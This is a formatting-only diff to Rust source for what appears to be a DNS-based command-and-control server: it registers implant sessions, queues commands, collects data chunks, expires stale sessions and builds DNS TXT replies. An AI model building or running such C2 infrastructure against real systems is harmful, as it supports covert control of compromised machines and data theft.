@@ -103,18 +103,21 @@ impl C2State {
 
     pub fn get_or_create_session(&mut self, implant_id: &str) -> &mut ImplantSession {
         let is_new = !self.sessions.contains_key(implant_id);
-        let session = self.sessions.entry(implant_id.to_string()).or_insert(ImplantSession {
-            id: implant_id.to_string(),
-            command_queue: Vec::new(),
-            data_chunks: HashMap::new(),
-            last_seen: std::time::SystemTime::now(),
-        });
-            
+        let session = self
+            .sessions
+            .entry(implant_id.to_string())
+            .or_insert(ImplantSession {
+                id: implant_id.to_string(),
+                command_queue: Vec::new(),
+                data_chunks: HashMap::new(),
+                last_seen: std::time::SystemTime::now(),
+            });
+
         if is_new {
             println!("\n[!] NEW IMPLANT REGISTERED: {}", implant_id);
             println!("{:=<70}", "");
         }
-        
+
         session
     }
 
@@ -188,12 +191,13 @@ impl C2State {
                 .join("")
         })
     }
-    
+
     pub fn cleanup_stale_sessions(&mut self) -> usize {
         let timeout = Duration::from_secs(SESSION_TIMEOUT_SECS);
         let now = SystemTime::now();
-        
-        let stale: Vec<String> = self.sessions
+
+        let stale: Vec<String> = self
+            .sessions
             .iter()
             .filter(|(_, session)| {
                 now.duration_since(session.last_seen)
@@ -202,13 +206,16 @@ impl C2State {
             })
             .map(|(id, _)| id.clone())
             .collect();
-        
+
         let count = stale.len();
         for id in stale {
-            println!("[!] Removing stale session: {} (timeout: {}s)", id, SESSION_TIMEOUT_SECS);
+            println!(
+                "[!] Removing stale session: {} (timeout: {}s)",
+                id, SESSION_TIMEOUT_SECS
+            );
             self.sessions.remove(&id);
         }
-        
+
         count
     }
 
@@ -224,7 +231,6 @@ impl C2State {
         }
     }
 }
-
 
 // Parse DNS domain name from query (RFC 1035 Section 4.1.2)
 pub fn parse_domain_name(buf: &[u8], mut offset: usize) -> Result<(String, usize), &'static str> {
@@ -336,9 +342,9 @@ pub fn build_txt_record_response(query: &[u8], query_len: usize, txt_data: &str)
     // Answer section
     response.push(0xC0);
     response.push(0x0C);
-    response.extend_from_slice(&16u16.to_be_bytes());   // Type TXT
-    response.extend_from_slice(&1u16.to_be_bytes());    // Class IN
-    response.extend_from_slice(&60u32.to_be_bytes());   // TTL
+    response.extend_from_slice(&16u16.to_be_bytes()); // Type TXT
+    response.extend_from_slice(&1u16.to_be_bytes()); // Class IN
+    response.extend_from_slice(&60u32.to_be_bytes()); // TTL
 
     let txt_bytes = txt_data.as_bytes();
     let data_len = (txt_bytes.len() + 1) as u16;
